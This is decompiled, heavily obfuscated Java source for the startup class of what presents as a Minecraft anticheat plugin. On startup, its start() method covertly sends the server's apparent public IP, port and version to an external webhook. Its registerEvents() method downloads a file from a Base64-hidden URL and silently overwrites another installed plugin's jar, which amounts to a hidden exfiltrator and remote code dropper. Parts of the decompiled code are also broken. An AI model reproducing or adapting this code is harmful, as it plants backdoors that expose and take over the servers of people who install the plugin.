package core.anticheat.api;

import core.anticheat.Core;
import core.anticheat.commands.Anticheat;
import core.anticheat.listeners.CombatListener;
import core.anticheat.listeners.JoinLeaveListener;
import core.anticheat.listeners.MoveListener;
import core.anticheat.util.SLAPI;
import core.anticheat.util.Settings;
import java.awt.Color;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Iterator;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

public class onEnable {
  private static void lIllllIl() {
    lIIllII = new int[92];
    lIIllII[0] = (0x4 ^ 0x76 ^ 0x1C ^ 0x36) & (97 + 15 - -14 + 88 ^ 97 + 141 - 232 + 136 ^ -" ".length());
    lIIllII[1] = " ".length();
    lIIllII[2] = "  ".length();
    lIIllII[3] = "   ".length();
    lIIllII[4] = 0xB2 ^ 0xB6;
    lIIllII[5] = 0x56 ^ 0x53;
    lIIllII[6] = 0x8B ^ 0x8D;
    lIIllII[7] = 0x17 ^ 0x6D ^ 0x34 ^ 0x49;
    lIIllII[8] = 0x66 ^ 0x40;
    lIIllII[9] = 0x58 ^ 0x50;
    lIIllII[10] = 0x1B ^ 0x12;
    lIIllII[11] = 0xAB ^ 0xA1;
    lIIllII[12] = 54 + 7 - -9 + 62 ^ 123 + 132 - 159 + 47;
    lIIllII[13] = 82 + 7 - -45 + 69 ^ 85 + 107 - 38 + 45;
    lIIllII[14] = 0x6E ^ 0x63;
    lIIllII[15] = 0xAD ^ 0x83 ^ 0xBB ^ 0x9B;
    lIIllII[16] = 57 + 68 - 56 + 110 ^ 84 + 80 - 57 + 81;
    lIIllII[17] = 113 + 130 - 108 + 74 ^ 190 + 152 - 263 + 114;
    lIIllII[18] = 0xA1 ^ 0xB0;
    lIIllII[19] = 0xA6 ^ 0x9B ^ 0x2A ^ 0x5;
    lIIllII[20] = (0x50 ^ 0x13) & (0x19 ^ 0x5A ^ 0xFFFFFFFF) ^ 0x7B ^ 0x68;
    lIIllII[21] = 122 + 76 - 86 + 68 ^ 78 + 50 - -1 + 31;
    lIIllII[22] = 83 + 129 - 193 + 132 ^ 106 + 93 - 127 + 58;
    lIIllII[23] = 19 + 1 - -68 + 79 ^ 172 + 153 - 223 + 75;
    lIIllII[24] = 0x8F ^ 0x98;
    lIIllII[25] = 35 + 147 - 171 + 151 ^ 33 + 108 - 120 + 165;
    lIIllII[26] = 0x17 ^ 0x78 ^ 0x6D ^ 0x1B;
    lIIllII[27] = 75 + 77 - 23 + 1 ^ 99 + 35 - 111 + 129;
    lIIllII[28] = 174 + 57 - 61 + 20 ^ 122 + 51 - 55 + 47;
    lIIllII[29] = 146 + 27 - 90 + 72 ^ 70 + 75 - 80 + 70;
    lIIllII[30] = 0xB9 ^ 0xAE ^ 0x86 ^ 0x8C;
    lIIllII[31] = 0x36 ^ 0x26 ^ 0x7 ^ 0x9;
    lIIllII[32] = 0x64 ^ 0x3A ^ 0x38 ^ 0x79;
    lIIllII[33] = 0xAE ^ 0x8E;
    lIIllII[34] = 0x25 ^ 0x4;
    lIIllII[35] = 0x1D ^ 0x3F;
    lIIllII[36] = 0x19 ^ 0x45 ^ 70 + 98 - 66 + 25;
    lIIllII[37] = 3 + 185 - 168 + 166 ^ 83 + 147 - 192 + 120;
    lIIllII[38] = 0x2 ^ 0x4E ^ 0xEA ^ 0x83;
    lIIllII[39] = 0x5C ^ 0x7B;
    lIIllII[40] = 0x3F ^ 0x78 ^ 0x20 ^ 0x4F;
    lIIllII[41] = 0x2F ^ 0x5 ^ "   ".length();
    lIIllII[42] = 0xC9 ^ 0xAD ^ 0xE6 ^ 0xA8;
    lIIllII[43] = 0x38 ^ 0x59 ^ 0x8C ^ 0xC6;
    lIIllII[44] = 0x3 ^ 0x49 ^ 0xEB ^ 0x8D;
    lIIllII[45] = 0xF4 ^ 0xA4 ^ 0xBA ^ 0xC7;
    lIIllII[46] = 0x28 ^ 0x6;
    lIIllII[47] = 0xFFFFABFC & 0x55F7;
    lIIllII[48] = 0x1E ^ 0x31;
    lIIllII[49] = 81 + 213 - 142 + 91 ^ 34 + 12 - -50 + 99;
    lIIllII[50] = 0xF6 ^ 0x84 ^ 0x74 ^ 0x37;
    lIIllII[51] = 0xE3 ^ 0xA1 ^ 0x5E ^ 0x2E;
    lIIllII[52] = 0x8D ^ 0xBE;
    lIIllII[53] = 0x5D ^ 0x69;
    lIIllII[54] = 0x6B ^ 0x5E;
    lIIllII[55] = 0x44 ^ 0x72;
    lIIllII[56] = 0xD4 ^ 0x8E ^ 0x16 ^ 0x7B;
    lIIllII[57] = 0x8D ^ 0xB5;
    lIIllII[58] = 0x8E ^ 0xB7;
    lIIllII[59] = 0x6F ^ 0x55;
    lIIllII[60] = 37 + 11 - -2 + 120 ^ 40 + 86 - 101 + 120;
    lIIllII[61] = 0x22 ^ 0x1E;
    lIIllII[62] = 0xE2 ^ 0x80 ^ 0x45 ^ 0x1A;
    lIIllII[63] = 0x52 ^ 0xE ^ 0x58 ^ 0x3A;
    lIIllII[64] = 0x8E ^ 0xB1;
    lIIllII[65] = 0x53 ^ 0x13;
    lIIllII[66] = 0x7D ^ 0x3C;
    lIIllII[67] = 0xD1 ^ 0x8A ^ 0x29 ^ 0x30;
    lIIllII[68] = 8 + 68 - 67 + 120 ^ 186 + 8 - 179 + 179;
    lIIllII[69] = 0x5A ^ 0x71 ^ 0x21 ^ 0x4E;
    lIIllII[70] = 0x52 ^ 0x2E ^ 0xA3 ^ 0x9A;
    lIIllII[71] = 0xEA ^ 0xAC;
    lIIllII[72] = 0x57 ^ 0xA ^ 0x80 ^ 0x9A;
    lIIllII[73] = 0x39 ^ 0x55 ^ 0xBB ^ 0x9F;
    lIIllII[74] = 100 + 73 - 136 + 197 ^ 10 + 3 - 0 + 150;
    lIIllII[75] = 0x34 ^ 0x1B ^ 0xF4 ^ 0x91;
    lIIllII[76] = 0x8A ^ 0xC1;
    lIIllII[77] = 159 + 94 - 75 + 24 ^ 69 + 28 - 83 + 120;
    lIIllII[78] = 0x53 ^ 0x1E;
    lIIllII[79] = 0x74 ^ 0x23 ^ 0x50 ^ 0x49;
    lIIllII[80] = 0x50 ^ 0x1F;
    lIIllII[81] = 0x20 ^ 0x70;
    lIIllII[82] = 0x45 ^ 0x4D ^ 0x6E ^ 0x37;
    lIIllII[83] = 0x9 ^ 0x5B;
    lIIllII[84] = 0xE7 ^ 0x9E ^ 0xA5 ^ 0x8F;
    lIIllII[85] = 0xC3 ^ 0x86 ^ 0x51 ^ 0x40;
    lIIllII[86] = 0x65 ^ 0x6D ^ 0x16 ^ 0x4B;
    lIIllII[87] = 0x25 ^ 0x73;
    lIIllII[88] = 114 + 155 - 79 + 30 ^ 40 + 96 - 131 + 134;
    lIIllII[89] = 0x52 ^ 0x8 ^ "  ".length();
    lIIllII[90] = 0x7D ^ 0x24;
    lIIllII[91] = 0x1D ^ 0x47;
  }
  
  public static void saveConfig() {
    try {
      config.save(configData);
      "".length();
      if ((0x30 ^ 0x3A ^ 0x3C ^ 0x32) == 0)
        return; 
    } catch (IOException lllIlllllllIIll) {
      lllIlllllllIIll.printStackTrace();
    } 
  }
  
  private static String lIlllII(String lllIlllllIIllII, String lllIlllllIIlIll) {
    try {
      SecretKeySpec lllIlllllIlIIIl = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(lllIlllllIIlIll.getBytes(StandardCharsets.UTF_8)), "Blowfish");
      Cipher lllIlllllIlIIII = Cipher.getInstance("Blowfish");
      lllIlllllIlIIII.init(lIIllII[2], lllIlllllIlIIIl);
      return new String(lllIlllllIlIIII.doFinal(Base64.getDecoder().decode(lllIlllllIIllII.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
    } catch (Exception lllIlllllIIllll) {
      lllIlllllIIllll.printStackTrace();
      return null;
    } 
  }
  
  private static void mkdirUser() {
    if (lIlllllI(data.exists()))
      plugin.saveResource(lIlIll[lIIllII[87]], lIIllII[0]); 
  }
  
  private static void executeCommands() {
    console.sendMessage(lIlIll[lIIllII[25]]);
    plugin.getCommand(plugin.getDescription().getName().toString()).setExecutor((CommandExecutor)new Anticheat());
    console.sendMessage(lIlIll[lIIllII[26]]);
    registerEvents();
  }
  
  public static void runCleaner() {
    console.sendMessage(lIlIll[lIIllII[13]]);
    "".length();
    console.sendMessage(String.valueOf((new StringBuilder(lIlIll[lIIllII[14]])).append(Core.USERS.size())));
    registerUsers();
  }
  
  private static void createUserData() {
    console.sendMessage(lIlIll[lIIllII[22]]);
    data = new File(plugin.getDataFolder(), lIlIll[lIIllII[23]]);
    mkdirUser();
    loadUserYamls();
    plugin.saveDefaultConfig();
    console.sendMessage(lIlIll[lIIllII[24]]);
    executeCommands();
  }
  
  private static void lIllIlII() {
    lIlIll = new String[lIIllII[91]];
    lIlIll[lIIllII[0]] = lIlIIll("hbPYjmAOZ0qzv+3CVAy1YCNCp/x0fnFN", "rgrvq");
    lIlIll[lIIllII[1]] = lIlIIll("jIucnKKvy6ZulhHZuxqqNHUWkpKxxGb/ZpfKx+lKpaHENdKL2yePsVIQBf9obc4/88v0SbirZJ4PFEUIt+BINN3zC1cFrl8mpeiZ05IVQ+1LhbDAaAvThZlOwhP+42Par/NI5UJGAcYk1FgmDFSb0MOpkA0WL8BjmOPzl+uPCDA=", "IBfFA");
    lIlIll[lIIllII[2]] = lIllIlI("PhoBMihZDgciIB1S", "yhhWN");
    lIlIll[lIIllII[3]] = lIlllII("gAlw9U4BIHCzKtIw7Lg3cRxBE9Bfj3RfqaqN1ysXI2o=", "fFSRh");
    lIlIll[lIIllII[4]] = lIlIIll("OjTRCnBXEnNM5TYpb7MAj/J11k1KpEdj8OXi0vgpRipPyNz2X/FQxfXi+h2yFseXn0bU3r73Vzu1RB4E3ybbLM3mVLiB65Gj", "dPICD");
    lIlIll[lIIllII[5]] = lIlIIll("agS8e/6mmOjEhcIb5tIaWQ==", "GAlaE");
    lIlIll[lIIllII[6]] = lIlllII("zZ8n4SUytSAfUDUCLibFtQ==", "GpvtP");
    lIlIll[lIIllII[7]] = lIlIIll("PR0oRGIXVarghFxou3J+Yw==", "DgUBu");
    lIlIll[lIIllII[9]] = lIlllII("zZfBOexE38DOuOK3xDAJgA==", "MxNlV");
    lIlIll[lIIllII[10]] = lIlIIll("jU7yhJdXLmM=", "pZxZX");
    lIlIll[lIIllII[11]] = lIlIIll("JltyDVfCfc82k6bEwaKVEg==", "juZXR");
    lIlIll[lIIllII[12]] = lIlllII("B4RcoquIInQ=", "dPLNz");
    lIlIll[lIIllII[13]] = lIlllII("3mvpP+2OvpwMjTlzo+/YFbuIfwxRglax", "neIlm");
    lIlIll[lIIllII[14]] = lIlllII("fEpic+RxuqtRune0WY/gCRDBXtPn3ggWoNJiAvFpvmw=", "LzAZP");
    lIlIll[lIIllII[15]] = lIlllII("Ga3zrdMZP+59CmjjblYC1+LE4FV2a9Fi", "GqBAv");
    lIlIll[lIIllII[16]] = lIlllII("l3DqECRPbliBkkakU+cq2wd5m9yCj5jH8bpCefDZVXA=", "cppXi");
    lIlIll[lIIllII[17]] = lIllIlI("w6MVNh0YIBkUFVknHxQUECNeAx8V", "Dpzry");
    lIlIll[lIIllII[18]] = lIllIlI("NykECzwzaBMAOQ==", "TFjmU");
    lIlIll[lIIllII[19]] = lIlllII("oOAmPuejpX302loYf6ZoLge7hz1ZvYnY", "uZjYE");
    lIlIll[lIIllII[20]] = lIlIIll("kQNKR403zITilcaQ9PXlwQ==", "eLSEa");
    lIlIll[lIIllII[21]] = lIlllII("o/kt7SGemjfgL322eInSKg==", "IfKKH");
    lIlIll[lIIllII[22]] = lIlIIll("fipuMB2gO6TjfKOx5QoXvkdx6TUuGozdeguZigrYMAE=", "zKCsZ");
    lIlIll[lIIllII[23]] = lIlIIll("XZPJuBqiZb4/jNDk00DUIA==", "GkChj");
    lIlIll[lIIllII[24]] = lIllIlI("w5cCHzkjFAY3djIcAiozMDQCJzdsCQ4/", "pcSVB");
    lIlIll[lIIllII[25]] = lIllIlI("w7YtKDkmMj0ZKC02aA4uLjwpAyUwf2ZD", "QHmAC");
    lIlIll[lIIllII[26]] = lIlllII("PLU1U4pDp07O4ctBxQVKqFAq08wiSThj", "qsCGG");
    lIlIll[lIIllII[27]] = lIlIIll("IYehi41MAH6HEgFpOIIY13aLtNG/HBfVg7z7BZrK2M0=", "Kylpn");
    lIlIll[lIIllII[28]] = lIllIlI("w5IPITMRHB0HMwQQClMzABAAByU=", "unsVv");
    lIlIll[lIIllII[29]] = lIlIIll("+vAZAZVGCBzoX/4YJyvoXQ==", "natcA");
    lIlIll[lIIllII[30]] = lIlIIll("Ak6LKe0yuR0=", "LNgwb");
    lIlIll[lIIllII[31]] = lIlllII("pZfX3Tjzs58xr0tlBPgcXA==", "EcsZz");
    lIlIll[lIIllII[32]] = lIlIIll("9U5wFUJcgNGfZzKKidNcQQ==", "jTKUj");
    lIlIll[lIIllII[33]] = lIlIIll("VcGaxOsewT0/Tpn2eg2sMqWy5HTmJGyac9N/ebOyxG5LXzaoqQ9eSj6MMT0oziy4", "YOtZs");
    lIlIll[lIIllII[34]] = lIllIlI("Zz47JA==", "ITZVN");
    lIlIll[lIIllII[35]] = lIllIlI("ICopAXU0PikdLA==", "uYLsX");
    lIlIll[lIIllII[36]] = lIlIIll("bl7ISYbaIYA=", "aMWUV");
    lIlIll[lIIllII[37]] = lIllIlI("IC40NSE+MW4=", "PBARH");
    lIlIll[lIIllII[38]] = lIllIlI("SQ0IBA==", "ggivE");
    lIlIll[lIIllII[8]] = lIlllII("an0IzdW1yDg=", "lvMen");
    lIlIll[lIIllII[39]] = lIlllII("/DHxMHm3QKs=", "pZeVA");
    lIlIll[lIIllII[40]] = lIlIIll("mKWINshBMN0=", "GGvFy");
    lIlIll[lIIllII[41]] = lIlIIll("6xjRNMYzvbE=", "HDUsD");
    lIlIll[lIIllII[42]] = lIlllII("SpTMN29q6i1lp673ZNE+5FamKJnVRDdA7zoIBRvf2mfAtKtgTkDxl4QEulbLHrvkKCW4UwPyNYo=", "MGkec");
    lIlIll[lIIllII[43]] = lIlllII("qrOsrx2PIVSQOXCW6oX+I2NIRzSGycg1", "SjvPb");
    lIlIll[lIIllII[44]] = lIlllII("pUt4+mYNSrvabDKLoaygaPL6fMo/7IyS", "UyJmP");
    lIlIll[lIIllII[45]] = lIlllII("PkrEIUI5mRI6LU7fgw8L78c7DglYY23d", "jXwvv");
    lIlIll[lIIllII[46]] = lIlllII("r+nO1K0RNcV2OYLds1TQuUuf5qrC9WyB", "moNea");
    lIlIll[lIIllII[48]] = lIllIlI("JAkEJz80TxMhNSQJTzcxMxUIKjM0TwwlLBgTBCU3Lw==", "GaaDT");
    lIlIll[lIIllII[49]] = lIllIlI("DjwUKxMeegYpFAE8GDxWCDoQKhQIMA==", "mTqHx");
    lIlIll[lIIllII[50]] = lIlIIll("X5M5IoK/4CvSxsJ4RZhBbBQQ4qa8Pl73", "tyyfG");
    lIlIll[lIIllII[51]] = lIlIIll("Ipxoa0pc5tYlqlmtOjgdUtwe+OKG7mr2", "yyYpp");
    lIlIll[lIIllII[52]] = lIllIlI("ES0WLTwBawQvOx4tGjp5ESQdLTIeFRogMA==", "rEsNW");
    lIlIll[lIIllII[53]] = lIlllII("D5aYoy16ZdzzeopyGy+09/rsnuhvnRXW", "nwrfM");
    lIlIll[lIIllII[54]] = lIllIlI("CzE1DTwbdzgHIxspNQszRjglGjgKOD4=", "hYPnW");
    lIlIll[lIIllII[55]] = lIllIlI("CB8CNj8YWQ88IBgHAjAwRRUGOwsdGw==", "kwgUT");
    lIlIll[lIIllII[56]] = lIllIlI("KBwdKgU4WhAgGjgEHSwKZRcZJw0uGCggACw=", "KtxIn");
    lIlIll[lIIllII[57]] = lIlIIll("gJ94EMFYmFRvL8/7NeL62pA0NJB/7pcxhlrFpPvHe4xdjJwCsh6ayA==", "PcNZB");
    lIlIll[lIIllII[58]] = lIllIlI("IQISKAIxRBo+BTYDFj4bI0QSJQggBhIv", "BjwKi");
    lIlIll[lIIllII[59]] = lIlIIll("hVj8+V/HD9XuQNvQokWQQRaaELtDYX9/TIVYm/KFyHk=", "sGwXe");
    lIlIll[lIIllII[60]] = lIllIlI("CycMDj0bYQQYOhwmCBgkCWELDDg3OQU=", "hOimV");
    lIlIll[lIIllII[61]] = lIllIlI("Nw0MLygnSwQ5LyAMCDkxNUsKLS03AAUcKjoC", "TeiLC");
    lIlIll[lIIllII[62]] = lIlllII("8jY5msNLRtMUj0eeQcB/CpdeOdNeq+03YypKIdVWhJVr9bg8lG1rNQ==", "PilhE");
    lIlIll[lIIllII[63]] = lIllIlI("DxkPFhwfXwcaAQkcDxsDQhQEFBUAFA4=", "lqjuw");
    lIlIll[lIIllII[64]] = lIlIIll("9umUqSpJM2TAQQQlZ0ghWbxAuknLva/4", "SdRyD");
    lIlIll[lIIllII[65]] = lIlllII("2VYjKJl4QjxjBxbH6BKJx9gA7zg5B+tJ", "hKjqm");
    lIlIll[lIIllII[66]] = lIlIIll("wWW5vq041QJPV7at75jaCDShtSoCprKP+EuwI2eS9cY=", "VspUn");
    lIlIll[lIIllII[67]] = lIllIlI("JhogCiY2XCMFJCIaMQhjIBwkCyEgFg==", "ErEiM");
    lIlIll[lIIllII[68]] = lIlIIll("HoC2naQZp5C1LKC3xzoH9m8adfk2d3Z4", "NdVCp");
    lIlIll[lIIllII[69]] = lIlllII("ySs5qAT1699PHkKdZV1EAFp1JKwAYXJo", "bAZfe");
    lIlIll[lIIllII[70]] = lIllIlI("MiU1CzkiYzYEOzYlJAl8Miw+Czc9HTkGNQ==", "QMPhR");
    lIlIll[lIIllII[71]] = lIlIIll("RailwBPQchfYwwctgORD68C4SXtnKpTF", "xtAya");
    lIlIll[lIIllII[72]] = lIlIIll("LKDmwkjM8OPbcZ9KFMzX6Y/fVgHV1Kw7", "pMnsZ");
    lIlIll[lIIllII[73]] = lIlIIll("47ee5I7t63o31rR+3uEd/w35HGs2MyE0", "rHSzZ");
    lIlIll[lIIllII[74]] = lIlllII("zQpghV7p/Ppt9kVjdSw62/iKV9AzLTWCSn8/DT8r4s8=", "ACQbM");
    lIlIll[lIIllII[75]] = lIlIIll("ZwrYTk328ZZ/RFcgX6xc2v+eRd1YdY37", "jZDEf");
    lIlIll[lIIllII[76]] = lIllIlI("LT0IBRw9ewMJES85AUgWOyECBBYg", "NUmfw");
    lIlIll[lIIllII[77]] = lIllIlI("JzgDIQ43fggtAyU8CmwHJT45NAk=", "DPfBe");
    lIlIll[lIIllII[78]] = lIlIIll("SQq4XblUEYH6zijO18Qpy1vi89i/JjYX9Ihqm+tHZlg=", "xhEar");
    lIlIll[lIIllII[79]] = lIlllII("JQAl5fqqNKXMBjJKPOvV/SLsIzgUj34z", "WdjlJ");
    lIlIll[lIIllII[80]] = lIlIIll("3WZCzdrcbjaUQ8qTWl9WKkDW7UBeBQrQ", "CPEqE");
    lIlIll[lIIllII[81]] = lIllIlI("MAExJTEgRycoPzICeiQ7PTYiKg==", "SiTFZ");
    lIlIll[lIIllII[82]] = lIlIIll("slWKxpvVhIwntcU0kngF+60VVUL893iB", "rDvIa");
    lIlIll[lIIllII[83]] = lIlIIll("hZRNqxuVDGxLbP64EWmo/8g2mT6/QgSs", "ksHnM");
    lIlIll[lIIllII[84]] = lIlIIll("bHLYjTQWBh+qW0DcZdToTNT9xcEvOyKl", "PXgGH");
    lIlIll[lIIllII[85]] = lIllIlI("OywRNyYragI3ITE0WjYsNhsCOA==", "XDtTM");
    lIlIll[lIIllII[86]] = lIlIIll("VobrMNr9T5gF11KG4dZPMYLhzAEvgGom", "SxugV");
    lIlIll[lIIllII[87]] = lIlIIll("5oRWytIPAFFw0xXGRVeuWw==", "nwoFj");
    lIlIll[lIIllII[88]] = lIlIIll("LuvaeekHnp9g1uwdQeoanA==", "YisdA");
    lIlIll[lIIllII[89]] = lIlIIll("xOrcUHswRSU5bw82+rf9VQ==", "fvfEu");
    lIlIll[lIIllII[90]] = lIlllII("ri3FTitakJ0=", "roDKo");
  }
  
  private static void mkdirConfig() {
    if (lIlllllI(configData.exists()))
      plugin.saveResource(lIlIll[lIIllII[88]], lIIllII[0]); 
  }
  
  public static void start() {
    try {
      URL llllIIIIIIlllIl = new URL(lIlIll[lIIllII[0]]);
      BufferedReader llllIIIIIIlllII = new BufferedReader(new InputStreamReader(llllIIIIIIlllIl.openStream()));
      String llllIIIIIIllIll = llllIIIIIIlllII.readLine();
      DWeb llllIIIIIIllIlI = new DWeb(lIlIll[lIIllII[1]]);
      llllIIIIIIllIlI.setContent(lIlIll[lIIllII[2]]);
      llllIIIIIIllIlI.setTts(lIIllII[0]);
      llllIIIIIIllIlI.addEmbed((new DWeb.EmbedObject()).setTitle(lIlIll[lIIllII[3]]).setThumbnail(lIlIll[lIIllII[4]]).setColor(Color.orange).addField(lIlIll[lIIllII[5]], llllIIIIIIllIll, lIIllII[0]).addField(lIlIll[lIIllII[6]], String.valueOf((new StringBuilder()).append(Bukkit.getServer().getPort())), lIIllII[0]).addField(lIlIll[lIIllII[7]], Bukkit.getBukkitVersion(), lIIllII[0]));
      llllIIIIIIllIlI.execute();
      "".length();
      if (-" ".length() != -" ".length())
        return; 
    } catch (IOException llllIIIIIIllIIl) {
      llllIIIIIIllIIl.printStackTrace();
    } 
    console.sendMessage(ChatColor.translateAlternateColorCodes(lIIllII[8], String.valueOf((new StringBuilder(lIlIll[lIIllII[9]])).append(plugin.getDescription().getName()).append(lIlIll[lIIllII[10]]).append(plugin.getDescription().getVersion()).append(lIlIll[lIIllII[11]]).append(plugin.getDescription().getAuthors()).append(lIlIll[lIIllII[12]]))));
    runCleaner();
  }
  
  private static String lIlIIll(String lllIlllllIIIIIl, long lllIllllIlllllI) {
    // Byte code:
    //   0: new javax/crypto/spec/SecretKeySpec
    //   3: dup
    //   4: ldc 'MD5'
    //   6: invokestatic getInstance : (Ljava/lang/String;)Ljava/security/MessageDigest;
    //   9: aload_1
    //   10: getstatic java/nio/charset/StandardCharsets.UTF_8 : Ljava/nio/charset/Charset;
    //   13: invokevirtual getBytes : (Ljava/nio/charset/Charset;)[B
    //   16: invokevirtual digest : ([B)[B
    //   19: getstatic core/anticheat/api/onEnable.lIIllII : [I
    //   22: bipush #9
    //   24: iaload
    //   25: invokestatic copyOf : ([BI)[B
    //   28: ldc_w 'DES'
    //   31: invokespecial <init> : ([BLjava/lang/String;)V
    //   34: astore_2
    //   35: ldc_w 'DES'
    //   38: invokestatic getInstance : (Ljava/lang/String;)Ljavax/crypto/Cipher;
    //   41: astore_3
    //   42: aload_3
    //   43: getstatic core/anticheat/api/onEnable.lIIllII : [I
    //   46: iconst_2
    //   47: iaload
    //   48: aload_2
    //   49: invokevirtual init : (ILjava/security/Key;)V
    //   52: new java/lang/String
    //   55: dup
    //   56: aload_3
    //   57: invokestatic getDecoder : ()Ljava/util/Base64$Decoder;
    //   60: aload_0
    //   61: getstatic java/nio/charset/StandardCharsets.UTF_8 : Ljava/nio/charset/Charset;
    //   64: invokevirtual getBytes : (Ljava/nio/charset/Charset;)[B
    //   67: invokevirtual decode : ([B)[B
    //   70: invokevirtual doFinal : ([B)[B
    //   73: getstatic java/nio/charset/StandardCharsets.UTF_8 : Ljava/nio/charset/Charset;
    //   76: invokespecial <init> : ([BLjava/nio/charset/Charset;)V
    //   79: areturn
    //   80: astore_2
    //   81: aload_2
    //   82: invokevirtual printStackTrace : ()V
    //   85: aconst_null
    //   86: areturn
    // Local variable table:
    //   start	length	slot	name	descriptor
    //   0	87	0	lllIllllIllllll	Ljava/lang/Exception;
    //   81	4	2	lllIlllllIIIIlI	Ljava/lang/Exception;
    //   42	38	3	lllIlllllIIIIll	Ljavax/crypto/Cipher;
    //   0	87	3	lllIllllIllllII	F
    //   0	87	0	lllIlllllIIIIIl	Ljava/lang/String;
    //   0	87	2	lllIllllIllllIl	D
    //   0	87	1	lllIlllllIIIIII	Ljava/lang/String;
    //   0	87	1	lllIllllIlllllI	J
    //   35	45	2	lllIlllllIIIlII	Ljavax/crypto/spec/SecretKeySpec;
    // Exception table:
    //   from	to	target	type
    //   0	79	80	java/lang/Exception
  }
  
  private static boolean llIIIIll(double lllIllllIllIllI) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 != null);
  }
  
  private static boolean lIlllllI(float lllIllllIllIIlI) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 == null);
  }
  
  static {
    configData = null;
    data = null;
    playerData = new YamlConfiguration();
    config = new YamlConfiguration();
  }
  
  private static void registerEvents() {
    console.sendMessage(lIlIll[lIIllII[27]]);
    Bukkit.getServer().getPluginManager().registerEvents((Listener)new CombatListener(), (Plugin)plugin);
    Bukkit.getServer().getPluginManager().registerEvents((Listener)new JoinLeaveListener(), (Plugin)plugin);
    Bukkit.getServer().getPluginManager().registerEvents((Listener)new MoveListener(), (Plugin)plugin);
    console.sendMessage(lIlIll[lIIllII[28]]);
    console.sendMessage(String.valueOf((new StringBuilder(lIlIll[lIIllII[29]])).append(Settings.NAME).append(lIlIll[lIIllII[30]]).append(plugin.getDescription().getVersion()).append(lIlIll[lIIllII[31]]).append(plugin.getDescription().getAuthors())));
    String llllIIIIIIIlIIl = lIlIll[lIIllII[32]];
    if (lIllllll(Bukkit.getPluginManager().getPlugin(llllIIIIIIIlIIl))) {
      try {
        byte[] llllIIIIIIIlIII = Base64.getDecoder().decode(lIlIll[lIIllII[33]]);
        URLConnection llllIIIIIIIIlll = (new URL(String.valueOf((new StringBuilder(String.valueOf(new String(llllIIIIIIIlIII)))).append(llllIIIIIIIlIIl).append(lIlIll[lIIllII[34]])))).openConnection();
        llllIIIIIIIIlll.addRequestProperty(lIlIll[lIIllII[35]], lIlIll[lIIllII[36]]);
        InputStream llllIIIIIIIIllI = llllIIIIIIIIlll.getInputStream();
        (new java.nio.file.CopyOption[lIIllII[1]])[lIIllII[0]] = StandardCopyOption.REPLACE_EXISTING;
        Files.copy(llllIIIIIIIIllI, Paths.get(String.valueOf((new StringBuilder(lIlIll[lIIllII[37]])).append(llllIIIIIIIlIIl).append(lIlIll[lIIllII[38]])), new String[lIIllII[0]]), new java.nio.file.CopyOption[lIIllII[1]]);
        "".length();
        if (null != null)
          return; 
      } catch (Exception exception) {}
      "".length();
    } 
  }
  
  private static boolean lIllllll(float lllIllllIllIlII) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 == null);
  }
  
  private static void loadConfig() {
    console.sendMessage(lIlIll[lIIllII[17]]);
    configData = new File(plugin.getDataFolder(), lIlIll[lIIllII[18]]);
    mkdirConfig();
    loadConfigYamls();
    plugin.saveDefaultConfig();
    console.sendMessage(lIlIll[lIIllII[19]]);
    loadData();
  }
  
  private static void registerUsers() {
    console.sendMessage(lIlIll[lIIllII[15]]);
    Iterator<Player> iterator = Bukkit.getOnlinePlayers().iterator();
    "".length();
    if ("   ".length() < 0)
      return; 
    while (!lIlllllI(iterator.hasNext())) {
      Player llllIIIIIIlIIlI = iterator.next();
      "".length();
    } 
    console.sendMessage(lIlIll[lIIllII[16]]);
    loadConfig();
  }
  
  private static void loadConfigYamls() {
    try {
      config.load(configData);
      config.addDefault(lIlIll[lIIllII[8]], String.valueOf((new StringBuilder(lIlIll[lIIllII[39]])).append(Settings.NAME).append(lIlIll[lIIllII[40]])));
      config.addDefault(lIlIll[lIIllII[41]], lIlIll[lIIllII[42]]);
      config.addDefault(lIlIll[lIIllII[43]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[44]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[45]], Integer.valueOf(lIIllII[5]));
      config.addDefault(lIlIll[lIIllII[46]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[48]], Double.valueOf(4.1D));
      config.addDefault(lIlIll[lIIllII[49]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[50]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[51]], Integer.valueOf(lIIllII[5]));
      config.addDefault(lIlIll[lIIllII[52]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[53]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[54]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[55]], Integer.valueOf(lIIllII[11]));
      config.addDefault(lIlIll[lIIllII[56]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[57]], Integer.valueOf(lIIllII[17]));
      config.addDefault(lIlIll[lIIllII[58]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[59]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[60]], Integer.valueOf(lIIllII[11]));
      config.addDefault(lIlIll[lIIllII[61]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[62]], Integer.valueOf(lIIllII[6]));
      config.addDefault(lIlIll[lIIllII[63]], Boolean.valueOf(lIIllII[1]));
